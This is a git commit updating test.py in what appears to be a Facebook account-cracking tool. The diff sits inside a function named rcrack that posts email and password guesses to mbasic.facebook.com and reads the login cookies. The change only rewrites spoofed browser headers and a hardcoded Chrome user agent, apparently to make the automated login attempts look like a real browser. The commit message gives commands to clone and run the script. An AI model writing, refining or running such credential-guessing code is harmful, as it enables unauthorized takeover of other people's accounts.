6d2598e3383203131f3244f51be9d10dbdc1bbe7
Kaptan302 <124124982+Kaptan302@users.noreply.github.com>
2023-02-04 16:41:22 +0500

    Update test.py
    rm -rf test
    git clone https://github.com/Kaptan302/test.git
    ls
    cd test
    ls
    python test.py

--- test.py
+++ test.py
@@ -218,24 +218,43 @@ def rcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority': 'mbasic.facebook.com',
-            'method': 'GET',
-            'path': 'https://www.facebook.com/?_rdc=1&_rdr',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://mbasic.facebook.com/',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro,}
+			header_freefb = {'authority': 'web.facebook.com',
+
+                       'method': 'GET',
+
+                       'path': 'https://www.facebook.com/?_rdc=1&_rdr',
+
+                       'scheme': 'https',
+
+                       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+
+                       'accept-encoding': 'gzip, deflate, br',
+
+                       'accept-language': 'en-US,en;q=0.9',
+
+                       'referer': 'https://web.facebook.com/',
+
+                       'cache-control': 'max-age=0',
+
+                       'sec-ch-ua': '"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"',
+
+                       'sec-ch-ua-mobile': '?0',
+
+                       'sec-ch-ua-platform': '"Windows"',
+
+                       'sec-fetch-dest': 'document',
+
+                       'sec-fetch-mode': 'navigate',
+
+                       'sec-fetch-site': 'same-origin',
+
+                       'sec-fetch-user': '?1',
+
+                       'upgrade-insecure-requests': '1',
+
+                       'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+
+                       'viewport-width': '980',}
 			lo = session.post('https://mbasic.facebook.com/', cookies=cookies, headers=headers).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
